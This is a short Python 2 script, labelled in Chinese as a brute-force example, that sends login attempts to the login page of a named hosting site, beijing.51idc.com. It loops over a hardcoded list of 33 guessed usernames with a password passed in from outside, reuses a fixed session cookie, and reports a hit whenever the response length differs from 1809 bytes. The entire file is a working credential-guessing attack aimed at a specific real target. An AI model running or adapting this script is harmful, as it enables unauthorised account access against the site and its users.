# coding:utf8
__author__ = 'xy'
import requests

"""
爆破脚本示例

POST方式提交表单
用户名 => list1
密码   => 外部传入
"""
list1 = [
    'admin',
    'zhangwei',
    'wangf',
    'wangjing',
    'lixy',
    'wangl',
    'liq',
    'wangm',
    'liuy',
    'zhangjie',
    'wangq',
    'zhangtao',
    'zhangt',
    'liuj',
    'wangh',
    'chenj',
    'lid',
    'lih',
    'zhangp',
    'zhangyl',
    'yangy',
    'liugy',
    'zhanghong',
    'wangym',
    'wanglin',
    'liux',
    'chenc',
    'gaof',
    'lijg',
    'yangw',
    'wuxy',
    'wanggf',
    'chenjh'
]


def poc(i):
    try:
        for each in list1:
            url = 'http://beijing.51idc.com/login'
            h = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
                'Referer': 'http://beijing.51idc.com/login',
                'Cookie': 'PHPSESSID=t5u3ij8i1ijr8c5s8rcsvmki55',
                'Connection': 'keep-alive'
            }
            d = {
                'LoginId': str(each),
                'LoginPasswd': str(i)
            }

            s = requests.session()
            s.get(url=url)
            r = s.post(url=url, data=d)
            if not len(r.content) == 1809:
                print each, i
                return True
        return False
    except Exception, e:
        return False
